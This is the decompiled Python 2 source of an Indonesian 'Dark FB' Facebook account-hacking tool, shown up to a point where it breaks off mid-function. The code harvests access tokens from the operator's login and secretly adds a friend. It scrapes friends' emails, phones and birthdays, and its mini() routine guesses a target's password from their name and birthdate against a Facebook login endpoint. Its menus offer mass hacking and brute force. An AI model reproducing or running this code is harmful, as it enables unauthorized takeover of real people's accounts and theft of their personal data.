# TusBolled by L0V14N4DR
# My Team: Black Coder Crush, TERMUXID3, Skull Of Skill
# Python bytecode 2.7None
# Own Filename: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


logo = ' \n\x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;97m\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88      \x1b[1;96m\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xf0\x9f\x94\xb1\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\x1b[1;97m\xe2\x96\x88\x1b[1;91m\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc \x1b[1;97m- _ --_--\x1b[1;92m\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n\x1b[1;97m\xe2\x96\x88 \x1b[1;97m \x1b[1;97m_-_-- -_ --__\x1b[1;92m \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\x1b[1;97m\xe2\x96\x88\x1b[1;91m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\x1b[1;97m--  - _ --\x1b[1;92m\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mELITE v2.1\n\x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88      \x1b[1;96m\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xf0\x9f\x94\xb1\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\x1b[1;97m \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\n\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m\xe2\x95\x91\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mSANSBAE \x1b[1;97m                    \xe2\x95\x91\n\x1b[1;97m\xe2\x95\x91\x1b[1;93m* \x1b[1;97mGithub  \x1b[1;91m: \x1b[1;96mhttps://github.com/SansBae\x1b[1;97m  \xe2\x95\x91\n\x1b[1;97m\xe2\x95\x91\x1b[1;93m* \x1b[1;97mFB      \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://fb.me/anbia.sans\x1b[0m    \x1b[1;97m\xe2\x95\x91\n\x1b[1;97m\xe2\x95\x91\x1b[1;93m* \x1b[1;97mVersion \x1b[1;91m: \x1b[1;92m\x1b[4m2.1\x1b[0m                         \x1b[1;97m\xe2\x95\x91\n\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;33m[\xe2\x9c\x93] Buat Akun Baru Jika Tidak Ingin Checkpoint\n\x1b[1;33m[?] Subscribe Channel SANSBAE Bro!!\n\x1b[1;33m[!] Share Bro Agar Kita Makin Maju'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;96m[\xe2\x97\x8f] \x1b[1;93mSedang Login \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def siapa():
    os.system('clear')
    nama = raw_input('\x1b[1;97mMasukkan Nama Anda! \x1b[1;91m: \x1b[1;92m')
    if nama == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        time.sleep(1)
        siapa()
    else:
        os.system('clear')
        jalan('\x1b[1;97mSelamat Datang \x1b[31;1m' + nama + '\n\x1b[1;97mJangan BarBar Kali Kau,Salam SANSBAE \nSubscribe Channel SANSBAE dulu Sob!! \nBuruan search sono coeg!! \nOH iya sedikit penjelasan nih coeg \nWarna Hijau Pada Akun yang sedang dihack \nTandanya Akun Sedang Online,Jadi \nBerkemungkinan Checkpoint Ya boss \nSebaliknya Jika Akun Yang Dihack \nBerwarna Kuning Maka Akun Sedang Offline \nAkun Bisa Langsung Dipakai Ya')
        time.sleep(2)
        loginSC()


def loginSC():
    os.system('clear')
    jalan('\x1b[33;1m*Baca Sebelum Menggunakan Script Ini!!\nSebelum Kalian Hack Akun Fb Orang Lain \nKalian Harus Memasukan Username & Passwordnya \nJika Kalian Tidak Mempunyai Lisensinya \nKalian langsung lihat Username Dan Passwordnya \nDi Website, Otomatis Akan Di Alihkan ke Websitenya\nJangan Subscribe Selain Dari Channel SANSBAE \nWaspada Reuploader DI mana mana coeg\nBerkaryalah, tanpa menggunakan karya orang lain bro !!! \nJangan Menjadi Youtubers Sampah \nYang Hanya Menjiplak Karya Orang Lain \nSubscribe Hanya Di Channel SANSBAE \nBukan Yang Lain Oke \nThanks For ALLAH SWT.............')
    os.system('xdg-open https://cyberinfo25.blogspot.com/2020/05/script-dark-fb-terbaru-anti-checkpoint_31.html')
    username = raw_input('\x1b[1;96m[*] \x1b[1;97mUsername \x1b[1;91m: \x1b[1;92m')
    password = raw_input('\x1b[1;96m[*] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m')
    if username == 'iribilangboss' and password == 'bukaneditorberkelas':
        print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin berhasil'
        time.sleep(1)
        masuk()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mSalah!!'
        os.system('xdg-open https://cyberinfo25.blogspot.com/2020/05/script-dark-fb-terbaru-anti-checkpoint_31.html')
        time.sleep(1)
        LoginSC()


def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;92m\x1b[1;97m[\xe2\x98\x86] \x1b[1;94mLOGIN KE FACEBOOK DENGAN PILIHAN ANDA \x1b[1;97m[\xe2\x98\x86]'
    print '\x1b[1;91m\xe2\x95\x91--\x1b[1;91m>\x1b[1;96m'
    print '\x1b[1;96m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m1.\x1b[1;92m FB UserName/ID Login\x1b[1;91m'
    print '\x1b[1;92m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m2.\x1b[1;96m FB Token Login'
    print '\x1b[1;93m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m3.\x1b[1;93m Update'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m0.\x1b[1;91m Exit Tool'
    print '\x1b[1;95m\xe2\x95\x91--\x1b[1;91m>'
    msuk = raw_input('\x1b[1;96m\xe2\x95\x9a\xe2\x95\x90\x1b[1;1m>>>> \x1b[1;37m')
    if msuk == '':
        print '\x1b[1;91m[!] Wrong input'
        keluar()
    elif msuk == '1':
        login()
    elif msuk == '2':
        tokenz()
    elif msuk == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] AHHHHHHH :3'
        os.system('xdg-open https://www.youtube.com/c/SANSBAE')


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        print '\x1b[1;96m[\xe2\x98\x86] \x1b[1;93mSILAHKAN LOGIN AKUN FACEBOOK ANDA \x1b[1;96m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
        pwd = raw_input('\x1b[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Berhasill Boss Ku'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/c/SANSBAE')
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mTidak Ada Koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mSepertinya Akun Anda Kena Checkpoint'
            os.system('xdg-open https://www.youtube.com/c/SANSBAE')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;91m[?] \x1b[1;92mToken FB\x1b[1;91m : \x1b[1;93m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong'
        e = raw_input('\x1b[1;91m[?] \x1b[1;92mIngin Mendapatkan Token?\x1b[1;97m[y/n]: ')
        if e == '':
            keluar()
        elif e == 'y':
            login()
        else:
            keluar()


def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()
        except requests.exceptions.ConnectionError:
            print logo
            print '\x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + nama + (39 - len(nama)) * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m FBID \x1b[1;91m: \x1b[1;92m' + id + (39 - len(id)) * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Subs \x1b[1;91m: \x1b[1;92m' + sub + (39 - len(sub)) * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '\x1b[1;97m\xe2\x95\xa0' + 50 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. Kumpulkan Informasi Akun FB'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. Hack Akun Facebook'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. Bot Facebook'
    print '\xe2\x95\x91-> \x1b[1;37;40m4. Lainnya'
    print '\xe2\x95\x91-> \x1b[1;37;40m5. Info Update'
    print '\xe2\x95\x91-> \x1b[1;37;40m6. Logout'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Tutup Script'
    print '\x1b[1;37;40m\xe2\x95\x91'
    pilih()


def pilih():
    zedd = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if zedd == '':
        print "\x1b[1;91m[!] Can't empty"
        pilih()
    elif zedd == '1':
        informasi()
    elif zedd == '2':
        menu_hack()
    elif zedd == '3':
        menu_bot()
    elif zedd == '4':
        lain()
    elif zedd == '5':
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        os.system('xdg-open https://www.cyberinfo25.blogspot.com')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()
    elif zedd == '6':
        os.system('rm -rf login.txt')
        os.system('xdg-open https://www.youtube.com/c/SANSBAE')
        keluar()
    elif zedd == '0':
        keluar()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak Tersedia'
        pilih()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukkan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss ku \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak Ada'
            else:
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak Ada'
                else:
                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak Ada'
                    else:
                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNomor Telpon\x1b[1;97m  : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mNomor Telpon\x1b[1;97m  : \x1b[1;91mNot found'

                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m      : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m      : \x1b[1;91mTidak Ada'

                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLahir\x1b[1;97m      : ' + z['birthday']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mLahir\x1b[1;97m      : \x1b[1;91mTidak Ada'

                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m        : '
                        for q in z['education']:
                            try:
                                print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                            except KeyError:
                                print '\x1b[1;91m                   ~ \x1b[1;91mTidak Ada'

                    except KeyError:
                        pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna Tidak Ada'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()


def menu_hack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. Hack Akun FB target (\x1b[1;92mMenebak Sandi\x1b[1;97m)'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. Hack Akun FB Dengan File'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. Hack Akun FB Massal'
    print '\xe2\x95\x91-> \x1b[1;37;40m4. BruteForce (\x1b[1;92mTarget\x1b[1;97m)'
    print '\xe2\x95\x91-> \x1b[1;37;40m5. Cloning Yahoo'
    print '\xe2\x95\x91-> \x1b[1;37;40m6. Ambil ID/Email/HP'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    hack_pilih()


def hack_pilih():
    hack = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if hack == '':
        print "\x1b[1;91m[!] Can't empty"
        hack_pilih()
    elif hack == '1':
        mini()
    elif hack == '2':
        crack()
        hasil()
    elif hack == '3':
        super()
    elif hack == '4':
        brute()
    elif hack == '5':
        menu_yahoo()
    elif hack == '6':
        grab()
    elif hack == '0':
        menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak Ditemukan'
        hack_pilih()


def mini():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[ INFO ] Target Harus Berteman Dengan Anda !'
        try:
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + a['name']
            jalan('\x1b[1;91m[+] \x1b[1;92mMengecek Akun \x1b[1;97m...')
            time.sleep(1)
            jalan('\x1b[1;91m[+] \x1b[1;92mMeretas Keamanan \x1b[1;97m...')
            time.sleep(1)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                menu_hack()
            elif 'www.facebook.com' in y['error_msg']:
                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                print '\x1b[1;91m[!] \x1b[1;93mAkun Mungkin Checkpoint'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                menu_hack()
            else:
                pz2 = a['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                y = json.load(data)
                if 'access_token' in y:
                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    menu_hack()
                elif 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                    print '\x1b[1;91m[!] \x1b[1;93mAkun Mungkin Checkpoint'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    menu_hack()
                else:
                    pz3 = a['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                        menu_hack()
                    elif 'www.facebook.com' in y['error_msg']:
                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print '\x1b[1;91m[!] \x1b[1;93mAkun Mungkin Checkpoint'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                        menu_hack()
                    else:
                        lahir = a['birthday']
                        pz4 = lahir.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        y = json.load(data)
                        if 'access_token' in y:
                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                            menu_hack()
                        elif 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                            print '\x1b[1;91m[!] \x1b[1;93mAkun Mungkin Checkpoint'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                            menu_hack()
                        else:
                            pz5 = 'sayang'
